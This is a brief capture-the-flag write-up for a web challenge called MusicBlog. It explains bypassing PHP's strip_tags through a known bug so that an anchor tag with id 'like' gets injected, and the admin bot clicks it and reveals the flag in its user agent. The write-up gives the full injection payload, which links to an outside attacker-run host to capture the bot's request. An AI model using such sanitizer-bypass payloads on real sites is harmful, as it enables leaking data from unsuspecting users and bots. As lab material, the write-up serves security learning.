<h3>MusicBlog</h3>

<ul>
<li>Using the php <a href="https://bugs.php.net/bug.php?id=78814">bug</a>, bypass strip_tags to inject an <code>a</code> tag.</li>
<li>The bot clicks the element with the id <code>like</code>, so inject an <code>a</code> tag with the id=like.</li>
<li>Flag is in the user agent, so the bot clicking our link will give us the flag:</li>
</ul>

<p><code>
[[lol"&gt;&lt;/audio&gt;&lt;a/udio id="like" href="http://hax.perfect.blue:6969/lel"&gt;HAXXX&lt;audio src="]]
</code></p>
